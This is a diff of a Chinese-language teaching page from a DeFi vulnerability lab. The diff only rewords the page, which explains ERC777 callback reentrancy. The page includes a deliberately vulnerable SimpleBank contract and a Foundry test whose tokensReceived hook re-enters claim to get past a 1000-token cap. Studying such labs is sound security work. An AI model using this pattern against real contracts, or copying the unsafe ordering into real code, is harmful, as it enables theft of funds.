@@ -1,17 +1,18 @@
 # ERC777 回调和重入
 [ERC777-reentrancy.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/ERC777-reentrancy.sol)  
-**名称：** ERC777重入漏洞
+**名称：** ERC777重入性漏洞
 
 **描述：**  
-ERC777代币允许通过在代币转移过程中被调用的钩子来执行任意回调。
-如果不使用重入性保护，恶意的合约地址可能在这样的回调中引起重入。
+ERC777代币允许通过钩子函数在代币转账期间调用任意回调。  
+如果没有使用重入性保护机制，恶意合约地址可能会在这些回调中引发重入性攻击。
 
 **场景：**  
-每个EOA外部账户的最大铸造1000个，如何绕过这一限制？  
+每个外部账户(EOA)的最大索赔次数为1000次，你如何绕过这个限制？  
 
 
-**缓解建议：**  
-遵循 check-effect-interaction 并使用 OpenZeppelin 重入性保护。  
+**缓解方法：**  
+遵循“检查-效果-交互”原则，并使用OpenZeppelin的重入性保护机制。
+ 
 **参考：**  
 https://medium.com/cream-finance/c-r-e-a-m-finance-post-mortem-amp-exploit-6ceb20a630c5 
 
@@ -37,7 +38,7 @@ contract SimpleBank is Test {
     constructor(address nftAddress) {
         token = ERC777(nftAddress);
 
-        // 注册IERC1820Registry合约
+        // 注册IERC1820Registry合约接口
         IERC1820Registry registry = IERC1820Registry(
             address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24)
         );
@@ -56,7 +57,7 @@ contract SimpleBank is Test {
         );
 
         token.transfer(account, amount);
-        _mints[account] += amount; // 不遵守check-effect-interaction
+        _mints[account] += amount; // 不遵守“检查-效果-交互”原则
 
         return true;
     }
@@ -75,14 +76,14 @@ contract SimpleBank is Test {
 **如何测试：**  
 forge test --contracts src/test//ERC777-reentrancy.sol-vvvv   
 ```
-// 使用ERC777代币测试SimpleBank合约重入漏洞的函数
+// 用于测试SimpleBank合约与ERC777代币之间的重入漏洞
 function testERC777Reentrancy() public {
-    // 初始化用于管理ERC777代币接口的ERC1820注册合约
+    // 初始化用于管理ERC777代币接口的ERC1820Registry合约
     IERC1820Registry registry = IERC1820Registry(
         address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24)
     );
-    // 将此合约注册为ERC777TokensRecipient 接口的实现
-    // 这样，合约就能通过 "tokensReceived "钩子处理收到的 ERC777 代币。
+    // 将当前合约注册为ERC777TokensRecipient接口的实现
+    // 这样，合约就能通过 "tokensReceived "回调函数来处理接收到的ERC777代币。
     registry.setInterfaceImplementer(
         address(this),
         _TOKENS_RECIPIENT_INTERFACE_HASH,
@@ -99,7 +100,7 @@ function testERC777Reentrancy() public {
         "Before exploiting, My GLD Balance :",
         MyERC777TokenContract.balanceOf(address(this))
     );
-    // 从SimpleBank合约中申领代币，这将触发`tokensReceived`钩子
+    // 从SimpleBank合约中领取代币，这将触发`tokensReceived`回调函数
     SimpleBankContract.claim(address(this), 900); 
     console.log(
         "After exploiting, My GLD Balance :",
@@ -107,7 +108,7 @@ function testERC777Reentrancy() public {
     );
 }
 
-// 每当合约收到ERC777代币时就会调用"tokensReceived"钩子。
+// 每当合约收到ERC777代币时就会调用"tokensReceived"回调函数。
 function tokensReceived(
     address payable operator,
     address from,
@@ -116,15 +117,15 @@ function tokensReceived(
     bytes calldata data,
     bytes calldata operatorData
 ) external {
-    // 如果该合约的余额小于或等于1000，则重新进入SimpleBank 合约并申领1000个代币
+    // 如果该合约的余额小于或等于1000，则重新进入SimpleBank合约并申领1000个代币
     if (MyERC777TokenContract.balanceOf(address(this)) <= 1000) {
         console.log("Reentered");
         SimpleBank(operator).claim(address(this), 1000);
     }
 }
 
-// 接收ether的回退函数
+// 接收以太币的回退函数
 receive() external payable {}
 ```  
-**红色：** 绕过最大1000的铸造限制。
+**红色：** 绕过最大铸造次数为1000的限制。
 ![image](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F65488d49-0d6a-4c73-ab8d-75827b6a3fae%2FUntitled.png?table=block&id=5970a19d-75ee-44d3-9455-3fedec380a37&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)
